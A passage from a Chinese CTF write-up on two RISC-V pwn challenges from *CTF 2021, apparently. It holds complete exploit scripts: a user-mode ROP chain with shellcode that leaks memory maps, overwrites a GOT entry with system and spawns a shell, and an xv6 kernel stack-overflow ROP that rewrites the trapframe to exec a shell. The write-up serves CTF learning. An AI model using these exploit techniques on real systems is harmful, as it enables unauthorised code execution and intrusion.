rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

context(bits = 64, os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./main"

elf = ELF(filename)
# io = process(["./qemu-riscv64", "-g", "1234", "main"])
io = process(["./qemu-riscv64", "main"])

def lg(name, val):
    log.info(name+" : "+hex(val))

gets_addr = 0x00016a5a
bss = 0x00000000006f000
gad1 = 0x0001179e
gad2 = 0x00011772
gad3 = 0x0001178e
"""
        00011772 93 07 84 b8     addi       a5,s0,-0x478
        00011776 13 09 09 b9     addi       s2,s2,-0x470
        0001177a 33 09 f9 40     sub        s2,s2,a5
        0001177e 13 59 39 40     srai       s2,s2,0x3
        00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e
        00011786 13 04 84 b8     addi       s0,s0,-0x478
        0001178a 81 44           c.li       s1,0x0
                             LAB_0001178c                                    XREF[1]:     0001179a(j)  
        0001178c 1c 60           c.ld       a5=>->FUN_00010284,0x0(s0=>->FUN_00010250)       = 00010284
                                                                                             = 00010250
        0001178e 56 86           c.mv       a2,s5
        00011790 d2 85           c.mv       a1,s4
        00011792 4e 85           c.mv       a0,s3
        00011794 85 04           c.addi     s1,0x1
        00011796 82 97           c.jalr     a5=>FUN_00010284                                 undefined FUN_00010250()
                                                                                             undefined FUN_00010284()
        00011798 21 04           c.addi     s0,0x8
        0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c
                             LAB_0001179e                                    XREF[1]:     00011782(j)  
        0001179e e2 70           c.ldsp     ra,0x38(sp)
        000117a0 42 74           c.ldsp     s0,0x30(sp)
        000117a2 a2 74           c.ldsp     s1,0x28(sp)
        000117a4 02 79           c.ldsp     s2,0x20(sp)
        000117a6 e2 69           c.ldsp     s3,0x18(sp)
        000117a8 42 6a           c.ldsp     s4,0x10(sp)
        000117aa a2 6a           c.ldsp     s5,0x8(sp)
        000117ac 21 61           c.addi16sp sp,0x40
        000117ae 82 80           ret
"""

def gen_rop_chain(target, a0=0, a1=0, a2=0):
    payload = flat({
        0x40 * 0 + 0x38: gad2, # jmp to gad2
        0x40 * 0 + 0x30: target + 0x478, # set s0, a5 = s0 - 0x478
        0x40 * 0 + 0x20: target + 0x470, # set s2

        0x40 * 1 + 0x38: gad3, # jmp to gad3
        0x40 * 1 + 0x18: a0, # set s3, a0 = s3
        0x40 * 1 + 0x10: a1, # set s4, a1 = s4
        0x40 * 1 + 0x08: a2, # set s5, a2 = s5
        0x40 * 1 + 0x28: 0, # s1
        0x40 * 1 + 0x20: 1, # s2
    }, length=0x80, filler=b'\x00')
    return payload

def gen_shellcode(src):
    import os
    open("sc.c", 'w').write(src)
    os.system("riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc")
    os.system("riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin")
    return open("./sc.bin", "rb").read()


entry_addr = 0x000101c0

p1 = flat(
    # b"flag{have_you_tried_ghidra9.2_decompiler_@if_you_have_hexriscv_plz_share_it_with_me_thx:P}".ljust(0x118, '\x00'),
    b'a'*0x118,
    0xdeadbeef, # S0
    gad1, # ra
    gen_rop_chain(gets_addr, bss),
    gen_rop_chain(bss),
    # gen_rop_chain(entry_addr)
)

sla(io, "flag", p1)

# sleep(1)
sc1_src = """#include <linux/unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/uio.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>

    static char flag_path[] = "/./proc/self/maps";

    int syscall(uint64_t nr, ...);

    int _start(){
        char buf[0x1000];
        int fd = syscall(__NR_openat, AT_FDCWD, flag_path, 0, 0);
        syscall(__NR_read, fd, buf, sizeof(buf));
        syscall(__NR_write, 1, buf, sizeof(buf));
        syscall(__NR_read, fd, buf, sizeof(buf));
        syscall(__NR_write, 1, buf, sizeof(buf));
        syscall(__NR_read, 0, 0x6f000, 0x800);
        return 0;
    }

    asm(
        "syscall:\\n"
            "mv a7, a0\\n"
            "mv a0, a1\\n"
            "mv a1, a2\\n"
            "mv a2, a3\\n"
            "mv a3, a4\\n"
            "mv a4, a5\\n"
            "mv a5, a6\\n"
            "ecall\\n"
            "ret\\n"
    );
"""

sc1 = gen_shellcode(sc1_src)
# sc = open("./sc.bin", "rb").read()

sla(io, "wrong", sc1)

res = rr(io, 2)
lines = res.split(b"\n")

elf_base = 0
libc_base = 0

for l in lines:
    if b'qemu-riscv64' in l and elf_base == 0:
        elf_base = int(l[:l.find(b'-')], 16)
        lg("elf_base", elf_base)
    if b'libc-' in l and libc_base == 0:
        libc_base = int(l[:l.find(b'-')], 16)
        lg("libc_base", libc_base)

lg("elf_base", elf_base)
# elf = ELF("./qemu-riscv64")
# elf.address = elf_base
got_mprotect = elf_base + 0x6a3200
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc.address = libc_base
system_addr =  libc.symbols['system']

sc2_src = """#include <linux/unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    #include <sys/uio.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>

    static char flag_path[] = "./test";

    static uint64_t *ro_base = (uint64_t *) %#x;
    static uint64_t *got_ptr = (uint64_t *) %#x;
    static uint64_t system_addr = %#x;
    static uint64_t binsh_str = 0x68732f6e69622f;

    int syscall(uint64_t nr, ...);

    int _start(){
        char buf[0x1000];
        syscall(__NR_mprotect, ro_base, 0x3c000, 7);
        
        got_ptr[0] = system_addr;
        ro_base[0] = binsh_str;
        syscall(__NR_mprotect, ro_base, 0x3c000, 7);
        return 0;
    }

    asm(
        "syscall:\\n"
            "mv a7, a0\\n"
            "mv a0, a1\\n"
            "mv a1, a2\\n"
            "mv a2, a3\\n"
            "mv a3, a4\\n"
            "mv a4, a5\\n"
            "mv a5, a6\\n"
            "ecall\\n"
            "ret\\n"
    );
"""%(elf_base + 0x668000, got_mprotect, system_addr)

sc2 = b'\x01\x00'*0x80 + gen_shellcode(sc2_src) # prefill with nops

sl(io, sc2)

io.interactive()
```



## pwn-babyxv6

一个 riscv kernel pwn . 和之前遇到的 kernel pwn 题不太一样.

之前遇到的 kernel pwn 通常都是加载一个恶意内核模块, 或者有一些错误的系统配置, 选手需要利用漏洞进行提权进而拿到 flag . 而这个题目并没有用户一个 shell. 用户需要利用漏洞拿到一个 shell 进而拿到 flag.

作者在开源 riscv 操作系统: [xv6-riscv](https://github.com/mit-pdos/xv6-riscv) 的基础之上进行了修改. 通过比较源码可以发现作者添加了一个系统调用: `sys_baby` 该系统调用的实现中中包含一个栈溢出漏洞:

```c
uint64
do_overflow(uint64 src, int sz)
{
    char buf[0x20];
    return copyin(myproc()->pagetable, buf, src, sz);
}

uint64
sys_baby(void)
{
    int n;
    uint64 p;
    char pad[0x100];

    if (argint(1, &n) < 0 || argaddr(0, &p) < 0)
        return -1;
    return do_overflow(p, n);
}
```

主要逻辑在 `src/usr/chall.c` 中:

```c
#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int readnum() {
    char buf[0x20] = {0};
    read(0, buf, 0x10);
    return atoi(buf);
}

void challenge()
{
    int size;
    char input[0x80];

    printf("Welcome to babystack 2021!\n");
    printf("How many bytes do you want to send?\n");
    
    size = readnum();
    if (size > 0x1000) {
        printf("You are greedy!\n");
        return;
    }

    printf("show me your input\n");
    read(0, input, 0x80);
    baby(input, size);

    printf("It's time to say goodbye.\n");
    return;
}

int main(int argc, char *argv[])
{
    challenge();
    exit(0);
}
```

我们要做的就是利用利用  `do_overflow` 中的栈溢出漏洞 getshell. 

### 系统调用(syscall)和返回流程

简单来说, riscv 架构中有三种模式, M(Machine mode), S(Supervisor mode) 和 U(User mode). 其中 M 模式权限最高, S 模式次之, 操作系统内核就跑在 S 模式中, U 模式权限最低, 用户代码就跑在 U 模式中. **更多关于 riscv 中特权架构以及一些相关指令和寄存器的定义及作用建议参考 [RISC-V 手册](http://riscvbook.com/chinese/RISC-V-Reader-Chinese-v2p1.pdf) 中第十章.**

用户态代码使用 `ecall` 指令请求内核中的系统调用. 系统调用可以传递 6个参数, 使用 a0-a6 寄存器传递, 系统调用的编号则通过 a7 寄存器传递. 本题中系统调用的编号定义在 `src/kernel/syscall.h` 文件中.

实际代码实现中大致流程如下:

1. 用户态执行 `ecall` 指令
2. 进入 `src/kernel/trampoline.S` 中的 `trampoline`
   1. 将各个用户态寄存器保存到 `trapframe`结构体中
   2. 切换到内核态的页表
3. `src/kernel/trap.c` 中的 `usertrap(void)`
4. `src/kernel/syscall.c` 中的 `syscall(void)`
   1. 其中会从 `trapframe` 结构体中获取 a7 寄存器的值, 然后决定调用对应的系统调用函数(如 `sys_baby`).
   2. 对应的系统调用函数中也会从 `trapframe` 结构体中取寄存器的值作为参数.
5. `src/kernel/trap.c` 中的 `usertrapret(void)`
6. `src/kernel/trampoline.S` 中的 `userret`
   1. 切换到用户态的页表
   2. 从 `trapframe` 结构体中恢复各个用户态寄存器
   3. 执行 `sret` 指令返回用户态

其中:

- `trapframe` 结构体的定义见 `/src/kernel/proc.h`中`struct trapframe`
- 本题调试发现内核和用户态应该都没有开随机化, 栈地址. 但是调试发现 `trapframe` 的地址出现过两个值,  原因不详.
  - `0x0000000087f70000` 
  - `0x0000000087f77000`

### 调试

qemu 启动命令加上以下参数:

```
-S -gdb tcp::1234
```

调试脚本如下:

```bash
#!/bin/sh
gdb-multiarch -q \
  -ex 'set architecture riscv:rv64' \
  -ex 'file kernel' \
  -ex 'add-symbol-file _chall' \
  -ex 'target remote localhost:1234' \
  -ex 'b sys_baby' \
  -ex 'b *0x800041fc' \
;
```

其中:

- `add-symbol-file _chall` 是为了加载 `_chall`中的符号, 可以在用户态代码下断点, `_chall`是通过源码编译得到的.



如何实现跟踪从内核模式切换回用户模式(虽然并没有用到, 但还是值得记录一下)

笔者调试时发现, 在 `sret` 指令出执行 `si` 指令, 程序就直接跑飞了, 并不会走到用户态中, 为了实现在调试器中跟到用户态的代码, 可以使用如下方法:

1. 拿到用户代码中`ecall`后面指令的地址: `target_addr`
2. 在执行到 `sret`时先清除所有内核态的断点
3. 再执行 `b *target_addr`下断点即可.

**注意**:

- 必须得执行到切换到用户态页表时才能在用户态下断点, 否则 gdb 会报错
- 切换到用户态页表之后需要把内核态地址的断点删掉, 否则同样会报错
- 这个方法只能支持一次从内核态跟到用户态, 从用户态进入内核态就跟不回去了....
- 如果有什么更好的方法欢迎交流.
- 相关配置:
  - 系统: ubuntu 20.04
  - gdb: 9.2
  - 插件: gef
  - 

### rop getshell

因为我们最多只能输入0x80 字节. 所以需要进行一些比较巧妙的构造.

首先我们观察 `do_overflow` 返回时的寄存器状态:

- a0 = 0
- a1 指向我们的输入
- a2 值为输入的长度

基于这三个寄存器的值我们有以下思路: 我们如果可以控制a0寄存器, 使其指向 `trapframe` 结构体, 然后调用 `memcpy` 函数就可以实现对 `trapframe` 结构体的修改. 修改之后我们再次返回到 `usertrap` 函数进行一次系统调用. 此时们可以通过控制 a7 寄存器以及 a0-a6 参数寄存器实现任意系统调用, 那么我们就可以通过 `exec("sh", argv)`  getshell.

首先找到这个gadget

```assembly
80000fac:	fe843783          	ld	a5,-24(s0)
80000fb0:	853e                	mv	a0,a5
80000fb2:	60e2                	ld	ra,24(sp)
80000fb4:	6442                	ld	s0,16(sp)
80000fb6:	6105                	addi	sp,sp,32
80000fb8:	8082                	ret
```

通过这个 gadget 我们可以控制  a0 寄存器.我们通过覆盖栈上的ra寄存器先从 `do_overflow` 返回到 `80000fac` . 通过这个 gadget 我们可以使 a0 指向`trapframe+112` 处(即 a0 寄存器处). 然后再次控制栈上的 ra 寄存器返回到 `80001428` (memcpy 开头 add sp; sd ra 之后). 从而利用 memcpy 修改 `trapframe` 结构体中相关寄存器的值, 使得:

- a0 指向 "sh\0" (这是一个用户态地址, 因为没有随机化, 所以可以通过调试获得)
- a1 需要为合法用户态地址, 且 *a1 = 0
- a7 = 7 (exec 的 syscall number)

在 memcpy 返回的时候我们再通过控制栈上的 ra 寄存器返回到 `usertrap` 函数, 即可执行 `exec("sh", argv) `.

GETSHELL!

### 遇到的一些问题

使用 mount 挂载 fs.img 报错:

```bash
$ sudo mount -o loop ./fs.img ./rootfs
mount: /home/wxk/babyxv6/rootfs: wrong fs type, bad option, bad superblock on /dev/loop6, missing codepage or helper program, or other error.
```

猜测 fs.img 中的文件系统并不是 x86 linux 所支持的.

但是奇怪的是我用 binwalk 可以识别出但是也无法提取出其中的 elf 文件. 有空问问坤坤啥情况.

还好给了源码, 可以自己编译其中的一些文件, 尤其是 chall.

### 小结

我这个做法属于非预期解. 思路来源于赛后 [科恩组织的分享](https://www.youtube.com/watch?v=iQYizRu7jks) 中 0ops 的师傅分享的解题思路. 这个思路比出题人的思路更简洁 出题人的思路可以参考[官方wp](https://github.com/sixstars/starctf2021/tree/main/pwn-babyxv6).

最终 exp 如下:

```python
#coding:utf-8
from pwn import *

ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

context(bits = 64, endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

io = process("./run.sh", aslr=False)

def lg(name, val):
    log.info(name+" : "+hex(val))

gad1        = 0x80000fac
saved_sp    = 0x0000003fffffbe80 
memcpy_addr = 0x80001428
usertrap_addr = 0x800037ba

"""
a0 指向 "/bin/sh\0"
a1 需要为合法地址, 且 *a1 = 0
a7 = 7 ( exec 的 syscall number )
0x0000000000002f28 是用户态栈地址, 指向我们的输入.
0x0000000087f70000 是 trapframe 地址
"""
p1 = flat(
    0x0000000000002f28+0x10, 0x0000000000002f28+0x30, 
    "sh".ljust(8, '\x00'), 0x0000000087f70000 + 112,
    saved_sp, # s0/fp
    gad1,

    0, 7,
    saved_sp + 0x20,
    memcpy_addr,

    0, 0,
    0, 0,
    saved_sp + 0x20 + 0x30,
    usertrap_addr
)

sla(io, "want to send?", str(0x80))
sa(io, " input\n", p1)

context.log_level = "critical"
io.interactive()
```



# 结语

比赛期间由于有别的一些事情, 就做了两道题, 赛后有空再复现一下几个好玩的题目.

很有意思的比赛, 学到了很多新知识2333.

感谢复现过程中@X1do0提供的各种帮助orz.

# 参考

- [ARM Compiler armasm User Guide Version 6.6](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ)
- [ARMv8.3 Pointer Authentication](https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf)
- [PACIA, PACIZA, PACIA1716, PACIASP, PACIAZ](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ)
- [RETAA, RETAB](https://developer.arm.com/documentation/dui0801/k/A64-General-Instructions/RETAA--RETAB?lang=en)
- [ARM64下ROP，以及调试技巧总结](https://blog.csdn.net/qq_39869547/article/details/105255683)
- [official writeup](https://github.com/sixstars/starctf2021)
- [ghidra官网](https://ghidra-sre.org/)
- [宇轩大佬的wp](https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#)
- [mips64调试环境搭建](https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#)
- [shellcode tips -- wxk199's blog](https://pullp.github.io/2021/01/30/shellcode-tips/)
- [xv6-riscv](https://github.com/mit-pdos/xv6-riscv)

- [RISC-V 手册](http://riscvbook.com/chinese/RISC-V-Reader-Chinese-v2p1.pdf)

- [科恩高校合作传统pwn方向第一次活动](https://www.youtube.com/watch?v=iQYizRu7jks)